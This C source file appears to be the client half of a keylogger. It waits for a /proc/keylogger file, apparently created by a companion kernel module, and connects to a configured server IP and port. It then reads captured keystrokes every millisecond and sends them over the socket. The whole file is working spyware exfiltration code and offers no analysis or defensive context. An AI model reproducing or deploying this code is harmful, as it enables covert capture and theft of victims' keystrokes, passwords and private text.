#include "client.h"

/**
 * @brief Create a socket for communication.
 * 
 * This function initializes a socket using the AF_INET family and SOCK_STREAM type.
 * If the socket creation fails, it prints an error message and exits the program.
 * 
 * @return int The file descriptor of the created socket.
 */
int create_socket() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    return sock;
}

/**
 * @brief Connect to the server.
 * 
 * This function sets up the server address structure and attempts to connect to
 * the server using the provided socket. If the connection fails, it prints an
 * error message, closes the socket, and exits the program.
 * 
 * @param sock The file descriptor of the socket.
 * @param server_addr Pointer to the server address structure.
 */
void connect_to_server(int sock, struct sockaddr_in *server_addr) {
    server_addr->sin_family = AF_INET;
    server_addr->sin_port = htons(SERVER_PORT);
    server_addr->sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr *)server_addr, sizeof(*server_addr)) == -1) {
        perror("connect");
        close(sock);
        exit(EXIT_FAILURE);
    }
}

/**
 * @brief Wait for the /proc/keylogger file to be created.
 * 
 * This function continuously checks for the existence of the /proc/keylogger file
 * and prints a waiting message until the file is available.
 */
void wait_for_procfs() {
    while (access(PROCFS_PATH, F_OK) == -1) {
        printf("Waiting for /proc/keylogger to be created...\n");
        sleep(SEC);
    }
}

/**
 * @brief Open the /proc/keylogger file.
 * 
 * This function attempts to open the /proc/keylogger file for reading.
 * If the file cannot be opened, it prints an error message and exits the program.
 * 
 * @return int The file descriptor of the opened file.
 */
int open_procfs() {
    int fd = open(PROCFS_PATH, O_RDONLY);
    if (fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }
    return fd;
}

/**
 * @brief Read data from /proc/keylogger and send it to the server.
 * 
 * This function continuously reads data from the /proc/keylogger file and sends it
 * to the server using the provided socket. It resets the file pointer before each
 * read operation. If sending data fails, it prints an error message, closes the
 * file and socket, and exits the program.
 * 
 * @param fd The file descriptor of the /proc/keylogger file.
 * @param sock The file descriptor of the socket connected to the server.
 */
void read_and_send_data(int fd, int sock) {
    char buffer[BUFF_SIZE];
    ssize_t bytes_read;

    while (true) {
        usleep(ONE_MSEC); // Sleep for 1 millisecond
        lseek(fd, 0, SEEK_SET); // Reset file pointer
        bytes_read = read(fd, buffer, sizeof(buffer) - 1);
        if (bytes_read > 0) {
            buffer[bytes_read] = '\0';
            if (send(sock, buffer, bytes_read, 0) == -1) {
                perror("send");
                close(fd);
                close(sock);
                exit(EXIT_FAILURE);
            } else {
                printf("Data transferred\n");
            }
        }
    }
}
